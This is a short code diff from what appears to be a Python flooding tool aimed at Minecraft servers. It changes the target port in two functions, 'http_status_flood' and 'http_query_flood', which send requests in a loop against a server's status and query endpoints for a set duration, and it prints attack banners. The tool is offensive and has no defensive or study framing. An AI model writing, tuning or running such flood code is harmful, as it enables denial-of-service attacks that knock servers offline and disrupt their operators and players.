@@ -121,7 +121,7 @@ def tcp_login(ip, port, duration, packet_size):
 def http_status_flood(ip, duration):
     end_time = time.time() + duration
     request_count = 0
-    url = f"http://{ip}:25565/status"  # Common Minecraft web status endpoint
+    url = f"http://{ip}:5555/status"  # Common Minecraft web status endpoint
     print(Fore.CYAN + f"[🚀] HTTP Status Flood on {url} | {duration}s...")
     try:
         while time.time() < end_time:
@@ -134,7 +134,7 @@ def http_status_flood(ip, duration):
 def http_query_flood(ip, duration):
     end_time = time.time() + duration
     request_count = 0
-    url = f"http://{ip}:25565/query"  # Common Minecraft query endpoint
+    url = f"http://{ip}:5555/query"  # Common Minecraft query endpoint
     print(Fore.CYAN + f"[🚀] HTTP Query Flood on {url} | {duration}s...")
     try:
         while time.time() < end_time:
